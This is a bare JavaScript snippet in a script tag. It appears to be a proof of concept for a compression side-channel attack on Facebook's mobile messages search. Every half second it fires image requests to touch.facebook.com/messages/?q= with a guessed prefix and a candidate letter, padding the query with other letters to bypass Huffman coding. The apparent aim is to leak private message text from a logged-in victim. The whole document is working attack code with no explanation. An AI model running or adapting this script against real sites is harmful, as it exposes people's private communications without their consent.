<script>

var alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
var pref;
var ref;
var ch = "a";
var j = 0;

function bypass_Huffman(ch) {
	for (i=0; i< alphabet.length; i++) {
		if (alphabet[i] != ch) {
			pref = pref + alphabet[i] + '_';
		}
	}
}

function makeRequest() {
	if (ch > "z") {
		ch = "a";
	        j++;
			console.log("Making Request %d", j);
        }
	pref = "potrynmkwi_";
	bypass_Huffman(ch);
	ref = "ghos";
	var img = new Image();
	img.src= "http://touch.facebook.com/messages/?q=" + pref + ref + ch;
	ch = String.fromCharCode(ch.charCodeAt(0) + 1);

	setTimeout(makeRequest, 500);
}

makeRequest();
</script>
